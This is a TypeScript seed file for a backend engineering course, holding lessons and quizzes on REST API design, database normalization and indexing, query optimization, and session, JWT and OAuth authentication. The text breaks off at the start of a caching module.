/* ============================================================
   BACKEND ENGINEER WORKSHOP — Seed Content
   ============================================================
   # Full backend engineering curriculum: APIs, databases, auth,
   # caching, message queues, observability, and security.
   # EXPANDED: Deep prose, analogies, step-by-step walkthroughs.
   ============================================================ */

export const backendEngineerModules = [
  /* ============================================================
     MODULE 1: API Design
     ============================================================ */
  {
    name: "API Design",
    slug: "api-design",
    description: "REST best practices, GraphQL fundamentals, API versioning, rate limiting, and documentation — with real examples.",
    order: 1,
    sections: [
      {
        title: "REST API Design Principles",
        slug: "rest-api-design",
        type: "lesson" as const,
        difficulty: "beginner" as const,
        estimatedMinutes: 45,
        order: 1,
        content: `## REST API Design Principles

An API (Application Programming Interface) is a contract between two pieces of software. The frontend says "give me this data" or "do this action," and the backend responds. REST (Representational State Transfer) is the most common architectural style for designing these contracts, and understanding it deeply is fundamental to backend engineering.

Think of a REST API like a restaurant. The menu (API documentation) lists what is available. The waiter (HTTP) carries your order (request) to the kitchen (server) and brings back your food (response). You do not need to know how the kitchen works — you just need to know the menu and how to place your order.

### The Six Constraints of REST

REST is not a protocol or a standard — it is a set of architectural constraints that make APIs predictable and scalable.

1. **Client-Server** — The frontend (client) and backend (server) are completely separate. The API does not care whether the client is a web browser, a mobile app, a CLI tool, or another server. This separation means you can redesign the entire frontend without touching the backend, and vice versa.

2. **Stateless** — Each request contains everything the server needs to process it. The server does not remember your previous requests. If you need to be authenticated, you send your token with EVERY request, not just the first one. This constraint is what makes REST APIs easy to scale — any server can handle any request because no server stores "session state."

3. **Cacheable** — Responses should explicitly say whether they can be cached and for how long. This is done through HTTP cache headers (Cache-Control, ETag, Expires). Proper caching can reduce server load by 50-90%.

4. **Uniform Interface** — Consistent URL patterns, HTTP methods, and response formats across your entire API. If \`GET /users\` returns a list, then \`GET /products\` should also return a list in the same format. Consistency means developers learn one endpoint and can predict how the rest work.

5. **Layered System** — The client does not know whether it is talking to the actual server, a load balancer, a CDN, or a caching proxy. This allows you to add layers (load balancers, firewalls, caches) without changing the client code.

6. **Code on Demand** (optional) — The server can send executable code to the client. This is rarely used in REST APIs but exists in the original definition.

### URL Design — Resources Are Nouns

The most important REST rule: URLs represent RESOURCES (things), not ACTIONS (verbs). The HTTP method (GET, POST, PUT, DELETE) specifies the action. The URL specifies the thing you are acting on.

| Bad (verb in URL) | Good (resource as noun) | Why |
|-------------------|------------------------|-----|
| GET /getUsers | GET /users | GET already means "get" |
| POST /createUser | POST /users | POST already means "create" |
| PUT /updateUser/123 | PUT /users/123 | PUT already means "replace" |
| DELETE /deleteUser/123 | DELETE /users/123 | DELETE already means "delete" |

**Nesting for relationships — but keep it shallow:**

\`\`\`
# Good — clear relationship between user and their orders
GET  /users/123/orders          # All orders for user 123
GET  /users/123/orders/456      # Specific order 456 for user 123
POST /users/123/orders          # Create a new order for user 123

# Bad — too deep. After 2 levels, flatten.
GET /users/123/orders/456/items/789/reviews

# Good — flatten deep nesting
GET /order-items/789/reviews
\`\`\`

The reason for limiting nesting depth is practicality: deeply nested URLs are hard to read, hard to type, and make your routing code complex. Two levels of nesting (resource/id/sub-resource) covers 95% of use cases.

### HTTP Methods — The Right Tool for the Job

Each HTTP method has specific semantics. Using the right method makes your API predictable and self-documenting.

| Method | Purpose | Idempotent? | Has Request Body? |
|--------|---------|-------------|-------------------|
| GET | Read a resource or collection | Yes | No |
| POST | Create a new resource | No | Yes |
| PUT | Replace a resource entirely | Yes | Yes |
| PATCH | Partially update a resource | No* | Yes |
| DELETE | Remove a resource | Yes | No |

**Idempotent** is a crucial concept: calling an idempotent method multiple times produces the same result as calling it once. \`PUT /users/123\` with the same body 10 times produces one user, not 10. \`DELETE /users/123\` called 10 times deletes the user once (subsequent calls return 404, but the end state is the same). \`POST /users\` called 10 times creates 10 users — POST is NOT idempotent.

This matters for reliability. If a network error occurs and the client is not sure whether the request succeeded, it can safely RETRY an idempotent method (PUT, DELETE) without fear of duplicates. Retrying a POST might create duplicates.

### Status Codes — Communicate Clearly

HTTP status codes tell the client what happened without parsing the response body. Using the wrong status code (like returning 200 for every response, including errors) makes your API confusing and breaks client-side error handling.

| Code | Meaning | When to Use |
|------|---------|-------------|
| 200 | OK | Successful GET, PUT, PATCH |
| 201 | Created | Successful POST that created a resource |
| 204 | No Content | Successful DELETE (nothing to return) |
| 400 | Bad Request | Invalid input — malformed JSON, missing required fields |
| 401 | Unauthorized | Not authenticated — no token, expired token |
| 403 | Forbidden | Authenticated but lacks permission for this action |
| 404 | Not Found | Resource does not exist |
| 409 | Conflict | Duplicate — email already exists, version conflict |
| 422 | Unprocessable Entity | Valid JSON but semantically wrong — "age: -5" |
| 429 | Too Many Requests | Rate limit exceeded |
| 500 | Internal Server Error | Bug in your code — should never happen intentionally |

The difference between 401 and 403 is important: 401 means "I do not know who you are — please log in." 403 means "I know who you are, but you do not have permission." The client handles these differently — 401 redirects to login, 403 shows a "permission denied" message.

### Response Format — Consistency Is King

Every response from your API should follow the same structure. Clients should never have to guess where the data is.

\`\`\`json
// # Success — single resource
{
  "data": {
    "id": "123",
    "name": "Jane Smith",
    "email": "jane@example.com"
  }
}

// # Success — collection with pagination metadata
{
  "data": [
    { "id": "123", "name": "Jane Smith" },
    { "id": "124", "name": "John Doe" }
  ],
  "pagination": {
    "page": 1,
    "perPage": 20,
    "total": 145,
    "totalPages": 8
  }
}

// # Error — structured, actionable error information
{
  "error": {
    "code": "VALIDATION_FAILED",
    "message": "Email address is invalid",
    "details": [
      { "field": "email", "message": "Must be a valid email address" }
    ]
  }
}
\`\`\`

### Pagination — Handling Large Collections

Never return all records at once. A \`GET /users\` that returns 1 million users will crash the client, saturate the network, and slow down the database.

**Offset-based:** \`GET /users?page=2&perPage=20\` — Simple, supports jumping to any page. But inconsistent if data changes between page loads (items can be duplicated or skipped).

**Cursor-based:** \`GET /users?after=abc123&limit=20\` — Consistent results even when data changes. The cursor is an opaque pointer (usually an encoded ID or timestamp). Cannot jump to page 5 directly. Best for infinite scroll, real-time feeds, and large datasets.

**Rule of thumb:** Use offset-based for admin dashboards with page numbers. Use cursor-based for infinite-scroll feeds and APIs consumed by mobile apps.

### Rate Limiting and Versioning

**Rate limiting** protects your API from abuse and ensures fair usage. Include rate limit headers in every response so clients know their budget:

\`\`\`
HTTP/1.1 200 OK
X-RateLimit-Limit: 100          # 100 requests per window
X-RateLimit-Remaining: 87       # 87 requests left
X-RateLimit-Reset: 1625097600   # Window resets at this Unix timestamp
\`\`\`

When exceeded, return 429 with a Retry-After header telling the client how long to wait.

**API versioning** is necessary when you make breaking changes (removing a field, changing a response format). The simplest and most widely used approach is URL versioning: \`/api/v1/users\`. Only increment versions for breaking changes — not every release.`,
      },
      {
        title: "API Design Quiz",
        slug: "api-design-quiz",
        type: "quiz" as const,
        difficulty: "beginner" as const,
        estimatedMinutes: 10,
        order: 2,
        content: `## REST API Design Quiz

<!--quiz
[
  {
    "question": "A client sends PUT /users/123 with the same body 5 times. How many users should exist after?",
    "options": [
      "5 new users (PUT creates like POST)",
      "1 user — the same one, unchanged after the first call",
      "It depends on the server implementation",
      "0 — PUT is for updates only, not creates"
    ],
    "correctIndex": 1,
    "explanation": "PUT is idempotent — calling it multiple times with the same data produces the same result. The first call creates or replaces the resource at /users/123, and subsequent calls just overwrite it with identical data. The end state is the same regardless of how many times you call it. This is the key difference from POST, which would create a new resource each time."
  },
  {
    "question": "A user tries to create an account but the email already exists. What status code should the API return?",
    "options": [
      "400 Bad Request",
      "422 Unprocessable Entity",
      "409 Conflict",
      "403 Forbidden"
    ],
    "correctIndex": 2,
    "explanation": "409 Conflict means the request conflicts with the current state of the resource — the email already exists, so creating a new account with it would violate uniqueness. 400 means the request syntax is wrong (malformed JSON). 422 means the data is structurally valid but semantically wrong (age: -5). 403 means the user lacks permission. A duplicate resource is specifically a conflict."
  },
  {
    "question": "Which pagination approach is best for an infinite-scroll social media feed with new posts arriving constantly?",
    "options": [
      "Offset-based (page=2&perPage=20) — supports jumping to any page",
      "Cursor-based (after=abc123&limit=20) — consistent even when data changes",
      "No pagination — return all posts at once",
      "Keyset-based (createdAfter=timestamp) — fast with indexes"
    ],
    "correctIndex": 1,
    "explanation": "Cursor-based pagination is ideal for real-time feeds where new data arrives constantly. With offset-based, if 5 new posts arrive while you are on page 2, page 3 will show duplicates of items from page 2 because everything shifted down by 5. Cursors say 'give me everything after THIS specific item,' so new items above the cursor don't affect your position. The results are always consistent."
  },
  {
    "question": "What's wrong with this endpoint: POST /api/getUserOrders?userId=123",
    "options": [
      "Nothing — it works fine",
      "Resources should be nouns (not verbs), and POST should not be used for reading data — should be GET /users/123/orders",
      "The userId should be in the request body, not the URL",
      "It should use PATCH instead of POST"
    ],
    "correctIndex": 1,
    "explanation": "Two REST violations: (1) 'getUserOrders' is a verb — REST URLs should be nouns representing resources: /users/123/orders. (2) POST is for creating resources, not reading them — reading is GET. The correct endpoint is GET /users/123/orders. Following REST conventions means developers can predict your API without reading documentation."
  },
  {
    "question": "An authenticated user tries to access an admin-only endpoint. What status code should be returned?",
    "options": [
      "401 Unauthorized — they can't access this",
      "403 Forbidden — authenticated but not authorized for this action",
      "404 Not Found — pretend the endpoint doesn't exist",
      "400 Bad Request — wrong request"
    ],
    "correctIndex": 1,
    "explanation": "403 Forbidden means 'I know who you are (authenticated), but you don't have permission for this action (not authorized).' 401 means 'I don't know who you are — please log in.' The distinction matters: 401 tells the client to authenticate, 403 tells them they need different permissions. Some APIs return 404 to hide the endpoint's existence (a valid security choice for sensitive endpoints), but 403 is the semantically correct answer."
  }
]
-->`,
      },
    ],
  },
  /* ============================================================
     MODULE 2: Database Design
     ============================================================ */
  {
    name: "Database Design",
    slug: "database-design",
    description: "Schema design, normalization, indexing strategy, query optimization, migrations, and choosing between SQL vs NoSQL.",
    order: 2,
    sections: [
      {
        title: "Schema Design & Normalization",
        slug: "schema-design-normalization",
        type: "lesson" as const,
        difficulty: "intermediate" as const,
        estimatedMinutes: 45,
        order: 1,
        content: `## Database Schema Design & Normalization

Database schema design is the foundation of every backend application. A well-designed schema makes your queries fast, your data consistent, and your application reliable. A poorly designed schema creates problems that no amount of caching or hardware can fix — you end up with slow queries, duplicated data, and bugs that emerge months after launch.

Think of your database schema like the blueprint of a building. You can renovate a room later, but you cannot easily change where the load-bearing walls are. Spending time on good schema design upfront saves enormous pain later.

### Normal Forms — Organizing Data to Eliminate Redundancy

Normalization is the process of organizing your database tables to minimize data redundancy and dependency. There are several "normal forms," each building on the previous one. You do not need to memorize the formal definitions — understanding the intuition is what matters.

**First Normal Form (1NF): Every column contains only one value**

Each cell in a table should hold one piece of data, not a list. If you are storing multiple phone numbers in a comma-separated string, you are violating 1NF.

| id | name | phone_numbers |
|----|------|---------------|
| 1 | Jane | 555-1234, 555-5678 |

This is problematic because: How do you search for a specific phone number? How do you count how many phone numbers each person has? How do you delete one phone number without rewriting the entire string?

The fix is a separate table:

\`\`\`sql
-- # Separate table for phone numbers — each row has ONE phone number
CREATE TABLE phone_numbers (
  id SERIAL PRIMARY KEY,
  user_id INT REFERENCES users(id),
  phone_number VARCHAR(20),
  type VARCHAR(10) -- 'mobile', 'home', 'work'
);
\`\`\`

**Second Normal Form (2NF): No partial dependencies**

Every non-key column must depend on the ENTIRE primary key, not just part of it. This mainly applies to tables with composite primary keys.

**Third Normal Form (3NF): No transitive dependencies**

A column should depend directly on the primary key, not on another non-key column. This is the most practically important normal form.

The classic example: an orders table that stores customer information alongside order information.

\`\`\`sql
-- # BAD (violates 3NF) — customer_name and customer_email
-- # depend on customer_id, NOT on order_id.
-- # If Jane changes her email, you must update EVERY row
-- # in the orders table where she has an order.
CREATE TABLE orders (
  order_id SERIAL PRIMARY KEY,
  customer_id INT,
  customer_name VARCHAR(100),   -- # Depends on customer_id, not order_id
  customer_email VARCHAR(255),  -- # Depends on customer_id, not order_id
  total DECIMAL(10,2)
);

-- # GOOD (3NF) — customer data lives in ONE place
-- # Change Jane's email once in the customers table,
-- # and every order automatically reflects the change.
CREATE TABLE customers (
  id SERIAL PRIMARY KEY,
  name VARCHAR(100),
  email VARCHAR(255) UNIQUE
);

CREATE TABLE orders (
  id SERIAL PRIMARY KEY,
  customer_id INT REFERENCES customers(id),
  total DECIMAL(10,2),
  created_at TIMESTAMP DEFAULT NOW()
);
\`\`\`

### When to Denormalize — Breaking the Rules Intentionally

Normalization is not always the right answer. Sometimes you intentionally duplicate data to avoid expensive JOIN operations on every read. This trade-off — write complexity for read speed — is called denormalization.

**Denormalize when:**
- You are doing expensive JOINs on every page load and reads vastly outnumber writes (100:1 or more)
- You need to display pre-computed aggregates frequently (order totals, comment counts, average ratings)
- You are building a read-heavy analytics or reporting system
- The duplicated data rarely changes (a user's name appears on every post — it changes once a year)

**Keep normalized when:**
- Data integrity is critical (financial transactions, medical records, user accounts)
- Writes are frequent and consistency is essential
- The data changes often and keeping duplicates in sync would be error-prone

### Indexing Strategy — Making Queries Fast

An index is a separate data structure that makes lookups fast. Without an index, the database must scan every row in the table to find matches (a "sequential scan" or "full table scan"). With an index, it can jump directly to the matching rows.

The analogy: imagine finding a word in a 1,000-page book. Without an index, you read every page. With an index at the back of the book, you look up the word and jump to the right page. The index uses extra space (a few pages at the back) but saves enormous time.

**When to add an index:**
- Columns used in WHERE clauses frequently
- Columns used in JOIN conditions (foreign keys)
- Columns used in ORDER BY
- Columns with high cardinality (many distinct values — email addresses, UUIDs)

**When NOT to index:**
- Small tables (under 1,000 rows) — scanning the whole table is fast enough
- Columns with very low cardinality (boolean columns, status with 3 values)
- Tables with heavy writes — every INSERT/UPDATE must also update the index

\`\`\`sql
-- # B-tree index (the default) — good for =, <, >, BETWEEN, ORDER BY
CREATE INDEX idx_users_email ON users(email);

-- # Unique index — B-tree + uniqueness enforcement
CREATE UNIQUE INDEX idx_users_email ON users(email);

-- # Composite index — order of columns matters!
CREATE INDEX idx_orders_user_date ON orders(user_id, created_at);
-- # This index helps: WHERE user_id = 123 AND created_at > '2024-01-01'
-- # This index helps: WHERE user_id = 123 (leftmost prefix rule)
-- # This index does NOT help: WHERE created_at > '2024-01-01' (skips first column)

-- # Partial index — only indexes rows matching a condition
-- # Smaller, faster, and perfect for common queries
CREATE INDEX idx_active_users ON users(email) WHERE status = 'active';
\`\`\`

The **leftmost prefix rule** for composite indexes is crucial: an index on (A, B, C) can be used for queries on (A), (A, B), or (A, B, C), but NOT for queries on (B) alone or (C) alone. Think of it like a phone book sorted by last name, then first name — you can look up by last name, or by last name + first name, but not by first name alone.

### SQL vs NoSQL — Choosing the Right Database

| Factor | SQL (PostgreSQL, MySQL) | NoSQL (MongoDB, DynamoDB) |
|--------|------------------------|--------------------------|
| Data structure | Known, relational, schema-enforced | Flexible, schema-less, evolving |
| Relationships | Complex, many-to-many JOINs | Few relationships, embedded documents |
| Consistency | ACID transactions guaranteed | Eventually consistent (usually) |
| Query flexibility | Complex ad-hoc queries, aggregations | Simple key-value lookups, limited queries |
| Scaling | Vertical (bigger server) | Horizontal (more servers) |
| Best for | E-commerce, banking, CRM, SaaS | Real-time analytics, IoT, content, gaming |

**Default to SQL** (PostgreSQL specifically) unless you have a specific, well-understood reason to use NoSQL. Most applications benefit from relational data modelling, ACID transactions, and the ability to write complex queries. PostgreSQL handles the vast majority of workloads excellently.`,
      },
      {
        title: "Query Optimization — Finding & Fixing Slow Queries",
        slug: "query-optimization",
        type: "lesson" as const,
        difficulty: "intermediate" as const,
        estimatedMinutes: 40,
        order: 2,
        content: `## Query Optimization — Finding and Fixing Slow Queries

A single slow query can bring down your entire application. When a query takes 5 seconds instead of 5 milliseconds, your database connection pool fills up, other queries queue behind it, response times spike, and users see errors. Learning to identify and fix slow queries is one of the most valuable backend skills you can develop.

### EXPLAIN — Your Most Important Debugging Tool

Every database has an EXPLAIN command that shows you exactly how it plans to execute a query. Reading EXPLAIN output is like reading an X-ray — it reveals what is happening inside.

\`\`\`sql
-- # EXPLAIN ANALYZE actually runs the query and shows real timing
EXPLAIN ANALYZE
SELECT * FROM orders
WHERE user_id = 123
ORDER BY created_at DESC
LIMIT 20;
\`\`\`

**What to look for in the output:**

| Indicator | Good Sign | Red Flag |
|-----------|-----------|----------|
| Scan type | Index Scan, Index Only Scan | Seq Scan (full table scan) on large tables |
| Rows examined | Close to rows returned | Much higher than rows returned |
| Execution time | Under 100ms | Over 1 second |
| Sort method | Index-based sort | In-memory or disk sort on large result sets |

A Seq Scan (sequential scan) on a table with 10 million rows means the database reads ALL 10 million rows to find your matches. An Index Scan means it uses the index to jump directly to the matching rows — potentially examining only 20 rows instead of 10 million.

### The Five Most Common Slow Query Patterns

**1. Missing index on a WHERE clause column**

This is by far the most common cause of slow queries. The fix is almost always: add an index.

\`\`\`sql
-- # SLOW: Sequential scan on 10 million rows
-- # The database reads every single row to check the status
SELECT * FROM orders WHERE status = 'pending';

-- # FIX: Add an index. Now it's an index lookup — milliseconds.
CREATE INDEX idx_orders_status ON orders(status);
\`\`\`

**2. SELECT * when you only need 2 columns**

SELECT * fetches all columns from disk, even if you only need the name and email. This wastes I/O bandwidth and memory, especially for tables with large text or binary columns.

\`\`\`sql
-- # SLOW: Fetches all 20 columns including large 'bio' text
SELECT * FROM users WHERE id = 123;

-- # FAST: Only fetches what you need
-- # May use a "covering index" — answered entirely from the index,
-- # without touching the table at all
SELECT name, email FROM users WHERE id = 123;
\`\`\`

**3. The N+1 query problem**

This is the most common performance bug in applications that use ORMs. You fetch a list of items, then make a separate query for each item's related data.

\`\`\`sql
-- # N+1 PATTERN: 101 queries for 100 posts
-- # Query 1: Get all posts
SELECT * FROM posts LIMIT 100;
-- # Then for EACH of the 100 posts:
SELECT * FROM users WHERE id = 1;   -- Query 2
SELECT * FROM users WHERE id = 2;   -- Query 3
...
SELECT * FROM users WHERE id = 100; -- Query 101

-- # FIX with JOIN: 1 query
SELECT p.*, u.name AS author_name
FROM posts p
JOIN users u ON p.user_id = u.id
LIMIT 100;

-- # FIX with batch loading: 2 queries
SELECT * FROM posts LIMIT 100;
SELECT * FROM users WHERE id IN (1, 2, 3, ..., 100);
\`\`\`

With 100 posts, the N+1 version makes 101 database round-trips. The JOIN version makes 1. The batch version makes 2. This can turn a 500ms endpoint into a 5ms endpoint.

In Prisma (the ORM used in this project), you fix N+1 with \`include\`:

\`\`\`typescript
// # BAD — N+1 queries
const posts = await prisma.post.findMany();
for (const post of posts) {
  const author = await prisma.user.findUnique({ where: { id: post.authorId } });
}

// # GOOD — 2 queries (Prisma JOINs automatically)
const posts = await prisma.post.findMany({
  include: { author: true },
});
\`\`\`

**4. Wildcard at the beginning of LIKE**

\`\`\`sql
-- # SLOW: Leading wildcard prevents index usage
-- # Must scan every row and check every email string
SELECT * FROM users WHERE email LIKE '%@gmail.com';

-- # FAST: Prefix search CAN use an index
SELECT * FROM users WHERE email LIKE 'jane%';

-- # For suffix search, consider a full-text search index
-- # or a reversed-email column with a normal index
\`\`\`

**5. Functions on indexed columns**

Applying a function to an indexed column prevents the database from using the index. The database cannot look up a transformed value in a B-tree built on the original values.

\`\`\`sql
-- # SLOW: YEAR() function prevents index on created_at from being used
SELECT * FROM orders WHERE YEAR(created_at) = 2024;

-- # FAST: Range query uses the index directly
SELECT * FROM orders
WHERE created_at >= '2024-01-01'
  AND created_at < '2025-01-01';
\`\`\`

### Pagination Performance

Deep offset pagination is a hidden performance killer. \`OFFSET 10000\` does not skip to row 10,001 — it reads and discards 10,000 rows. The deeper the page, the slower it gets.

\`\`\`sql
-- # SLOW for deep pages: reads and discards 10,000 rows
SELECT * FROM posts ORDER BY created_at DESC LIMIT 20 OFFSET 10000;

-- # FAST: Cursor-based (keyset) pagination
-- # Uses the index, reads only the 20 rows you need
SELECT * FROM posts
WHERE created_at < '2024-06-15T10:30:00'
ORDER BY created_at DESC
LIMIT 20;
\`\`\`

### Query Optimization Checklist

| Check | What to Do |
|-------|-----------|
| Slow query logging | Enable it with a 100ms threshold — you cannot fix what you cannot see |
| EXPLAIN shows Seq Scan | Add an index on the WHERE/JOIN/ORDER BY columns |
| SELECT * | Select only the columns you actually need |
| N+1 queries | Use JOINs, batch loading (IN clause), or ORM eager loading |
| Deep pagination | Switch from OFFSET to cursor-based (keyset) pagination |
| Counting rows | Cache the count or use database estimates for approximate counts |`,
      },
      {
        title: "Database Design Quiz",
        slug: "database-design-quiz",
        type: "quiz" as const,
        difficulty: "intermediate" as const,
        estimatedMinutes: 10,
        order: 3,
        content: `## Database Design Quiz

<!--quiz
[
  {
    "question": "Your users table has 10 million rows and this query is slow: SELECT * FROM users WHERE email = 'jane@example.com'. What's the most likely fix?",
    "options": [
      "Add more RAM to the database server",
      "Create an index on the email column",
      "Partition the table by email prefix",
      "Switch from SQL to NoSQL"
    ],
    "correctIndex": 1,
    "explanation": "Without an index on email, the database must read all 10 million rows (sequential scan) to find the matching email. An index on email makes this an O(log n) lookup — about 23 comparisons instead of 10 million. This is the single most common database performance fix. Run: CREATE UNIQUE INDEX idx_users_email ON users(email);"
  },
  {
    "question": "You have a composite index on (user_id, created_at). Which queries can use this index?",
    "options": [
      "WHERE created_at > '2024-01-01' (skips first column)",
      "WHERE user_id = 123 AND created_at > '2024-01-01' (uses both columns)",
      "WHERE created_at > '2024-01-01' AND user_id = 123 (different order)",
      "Both B and C — the query optimizer reorders conditions to match the index"
    ],
    "correctIndex": 3,
    "explanation": "Composite indexes follow the leftmost prefix rule: the index on (user_id, created_at) can be used for queries that include user_id, regardless of the order in the WHERE clause. The query optimizer reorders conditions to match the index structure. Both B and C include user_id and created_at, so both can use the index. Option A skips user_id entirely (the leftmost column), so the index cannot be used."
  },
  {
    "question": "When should you denormalize your database (intentionally duplicate data)?",
    "options": [
      "Always — normalized databases are slow",
      "Never — duplicated data causes inconsistencies",
      "When read performance matters more than write consistency, and you read far more often than you write",
      "When you have more than 100 tables"
    ],
    "correctIndex": 2,
    "explanation": "Denormalization trades write complexity for read performance. It makes sense when: (1) reads vastly outnumber writes (100:1 ratio or more), (2) the JOINs are expensive and run on every page load, and (3) you can tolerate the overhead of keeping duplicated data in sync. Example: storing a user's name on every post avoids JOINing the users table on every feed render. The trade-off is that updating the user's name requires updating every post too."
  }
]
-->`,
      },
    ],
  },
  /* ============================================================
     MODULE 3: Authentication & Authorization
     ============================================================ */
  {
    name: "Authentication & Authorization",
    slug: "auth-patterns",
    description: "JWT, OAuth 2.0, session management, RBAC, API key security, and common auth vulnerabilities.",
    order: 3,
    sections: [
      {
        title: "JWT & Session-Based Auth",
        slug: "jwt-session-auth",
        type: "lesson" as const,
        difficulty: "intermediate" as const,
        estimatedMinutes: 40,
        order: 1,
        content: `## Authentication: JWT vs Session-Based

Authentication and authorization are two different things that work together. Authentication answers "who are you?" — it verifies your identity. Authorization answers "what are you allowed to do?" — it checks your permissions. Every protected endpoint in your API needs both.

Think of it like entering a building. Authentication is showing your ID badge at the entrance (proving who you are). Authorization is whether your badge grants access to the executive floor (checking what you are allowed to do).

### Session-Based Authentication — The Traditional Approach

Session-based auth has been the standard for decades. It works by storing a record of your login on the server.

**How it works, step by step:**

1. User sends their username and password to \`POST /login\`
2. Server verifies the credentials against the database (hashed password comparison)
3. Server creates a "session" record (stored in a database or Redis) with a unique session ID
4. Server sends the session ID back to the browser as an HTTP-only cookie
5. The browser automatically includes this cookie with every subsequent request
6. On each request, the server looks up the session ID to find the user's identity and permissions
7. When the user logs out, the server deletes the session record

**Advantages of sessions:**
- Simple to implement and understand
- Easy to revoke — just delete the session record from the database
- Server has full control over all active sessions (you can see who is logged in, force logout)
- Session data (role, permissions) can be updated server-side without the user doing anything

**Disadvantages:**
- Requires server-side storage — every active user consumes server memory or database space
- Harder to scale across multiple servers — all servers need access to the session store (usually solved with Redis)
- Cookies do not work well for mobile apps or third-party API consumers

### JWT (JSON Web Token) Authentication — The Stateless Approach

JWT authentication does not store anything on the server. Instead, all the user's information is encoded in the token itself, signed cryptographically to prevent tampering.

**JWT Structure — three parts separated by dots:**

\`\`\`
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyXzEyMyJ9.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk

Header.Payload.Signature
\`\`\`

The **Header** specifies the algorithm: \`{ "alg": "HS256", "typ": "JWT" }\`

The **Payload** contains "claims" — data about the user:
\`\`\`json
{
  "sub": "user_123",           // Subject — the user ID
  "email": "jane@example.com", // Custom claim
  "role": "admin",             // Custom claim
  "exp": 1735689600            // Expiration time (Unix timestamp)
}
\`\`\`

The **Signature** is a cryptographic hash that ensures the payload has not been tampered with. Only the server (which knows the secret key) can create valid signatures.

**CRITICAL security note:** JWTs are base64-ENCODED, not encrypted. Anyone can decode the payload and read the claims. NEVER put secrets (passwords, API keys) in a JWT payload.

**Advantages of JWTs:**
- Stateless — the server does not store anything. Verification is purely cryptographic.
- Scales effortlessly across multiple servers — any server can verify the token independently
- Works great for APIs, mobile apps, microservices, and third-party integrations
- Contains user data — reduces database lookups on every request

**Disadvantages:**
- Cannot be revoked once issued — the token is valid until it expires (unless you build a blacklist, which adds state)
- If a token is stolen, the attacker has access until expiration
- Token size is larger than a session ID (hundreds of bytes vs. 32 bytes)

### Security Best Practices for Authentication

| Practice | Why It Matters |
|----------|---------------|
| Use HTTP-only cookies for tokens | Prevents JavaScript (and XSS attacks) from reading the token |
| Set Secure flag on cookies | Token only sent over HTTPS, never plain HTTP |
| Short-lived access tokens (15 min) + refresh tokens | Limits damage if a token is stolen |
| Never store sensitive data in JWT payload | JWTs are base64-encoded, NOT encrypted — anyone can read the payload |
| Use bcrypt or argon2 for password hashing | Resistant to brute force attacks and rainbow tables |
| Rate limit login attempts | Prevents brute force password guessing |
| Rotate signing keys periodically | Limits damage if a key is compromised |

### OAuth 2.0 — "Login with Google/GitHub"

OAuth lets users log in to your app using their existing accounts on Google, GitHub, Apple, etc. The user never shares their Google password with your app — they authenticate directly with Google, and Google gives your app a limited token.

**The Authorization Code flow (most secure):**

1. User clicks "Login with Google" on your app
2. Your app redirects the user to Google's login page
3. User logs in at Google and grants your app permission to read their profile
4. Google redirects the user back to your app with a temporary authorization code
5. Your SERVER exchanges this code for an access token (server-to-server, not through the browser)
6. Your server uses the access token to fetch the user's profile from Google
7. Your server creates a local account (or finds existing) and issues a session/JWT

Steps 5-7 happen server-to-server, so the access token never touches the browser. This is what makes the Authorization Code flow secure.

### RBAC (Role-Based Access Control)

RBAC is the most common authorization pattern. Each user has a role, and each role has a set of permissions.

\`\`\`typescript
// # Define what each role is allowed to do
const PERMISSIONS: Record<string, string[]> = {
  admin: ["read", "write", "delete", "manage_users", "view_analytics"],
  editor: ["read", "write"],
  viewer: ["read"],
};

// # Middleware that checks if the user has the required permission
function requirePermission(permission: string) {
  return (req: Request, res: Response, next: NextFunction) => {
    const userRole = req.user.role;
    const allowed = PERMISSIONS[userRole]?.includes(permission);
    if (!allowed) {
      return res.status(403).json({ error: "Forbidden — insufficient permissions" });
    }
    next();
  };
}

// # Usage — only users with "delete" permission can access this route
app.delete("/posts/:id", requirePermission("delete"), deletePost);
\`\`\`

The key advantage of RBAC is simplicity: you manage roles (a small number) instead of individual user permissions (potentially millions). When a new employee joins as an editor, you assign them the "editor" role and they immediately get all editor permissions.`,
      },
      {
        title: "Auth & Authorization Quiz",
        slug: "auth-authorization-quiz",
        type: "quiz" as const,
        difficulty: "intermediate" as const,
        estimatedMinutes: 10,
        order: 2,
        content: `## Authentication & Authorization Quiz

<!--quiz
[
  {
    "question": "What's the key difference between authentication and authorization?",
    "options": [
      "They're the same thing — both check passwords",
      "Authentication verifies WHO you are (identity). Authorization verifies WHAT you're allowed to do (permissions).",
      "Authentication is for APIs, authorization is for web pages",
      "Authentication uses tokens, authorization uses passwords"
    ],
    "correctIndex": 1,
    "explanation": "Authentication = identity verification (who are you? — login, JWT, OAuth). Authorization = permission check (what can you do? — role-based access, resource ownership). A logged-in user (authenticated) might still be forbidden from deleting other users' data (not authorized). Every protected endpoint needs BOTH checks: first verify identity, then verify permission."
  },
  {
    "question": "Your JWT access tokens last 30 days. A user's account is compromised. Why is this dangerous?",
    "options": [
      "30-day tokens are actually fine — they're encrypted",
      "The attacker has access for up to 30 days because the JWT is valid until expiration and cannot be revoked without extra infrastructure",
      "The token will automatically expire when the password is changed",
      "JWTs can be remotely invalidated by the server"
    ],
    "correctIndex": 1,
    "explanation": "JWTs are self-contained — the server verifies them cryptographically without checking a database. This means you CANNOT revoke a JWT once issued. Even if the user changes their password, the old JWT remains valid until its expiration date. With a 30-day token, that's 30 days of unauthorized access. Best practice: short-lived access tokens (15 minutes) with a refresh token mechanism. The refresh token can be revoked because it IS checked against a database."
  },
  {
    "question": "A user can view their own profile at GET /users/123. They change the URL to GET /users/456 and see another user's private data. What vulnerability is this?",
    "options": [
      "Cross-Site Scripting (XSS)",
      "SQL Injection",
      "Insecure Direct Object Reference (IDOR) — the server doesn't check if the user is authorized to access this specific resource",
      "Cross-Site Request Forgery (CSRF)"
    ],
    "correctIndex": 2,
    "explanation": "IDOR occurs when a user can access resources by guessing or manipulating IDs in the URL, and the server doesn't verify they have permission to access that specific resource. The fix: ALWAYS check that the authenticated user owns or has explicit permission to access the requested resource. Never trust the ID in the URL alone. Every route handler should verify: 'Does user X have access to resource Y?'"
  }
]
-->`,
      },
    ],
  },
  /* ============================================================
     MODULE 4: Caching & Performance
     ============================================================ */
  {
    name: "Caching & Performance",
    slug: "caching-performance",
    description: "Redis, CDNs, HTTP caching, database query optimization, connection pooling, and N+1 query detection.",
    order: 4,
    sections: [
      {
        title: "Caching Strategies",
        slug: "caching-strategies",
        type: "lesson" as const,
        difficulty: "intermediate" as const,
        estimatedMinutes: 40,
        order: 1,
